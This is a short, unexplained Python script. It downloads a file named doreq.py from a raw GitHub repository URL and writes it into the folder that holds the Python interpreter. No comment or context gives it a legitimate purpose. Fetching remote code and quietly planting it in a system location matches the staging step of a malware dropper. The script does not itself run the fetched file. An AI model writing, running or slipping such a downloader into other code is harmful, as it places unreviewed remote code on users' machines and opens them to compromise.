import os
import sys
import requests
pythonloc = os.path.dirname(sys.executable)
cont = requests.get('https://raw.githubusercontent.com/presy12/testrepo/main/doreq.py').content
with open('req.py', 'w') as req:
  req.write(cont.decode("utf-8"))
os.rename('req.py', pythonloc + '\doreq.py')
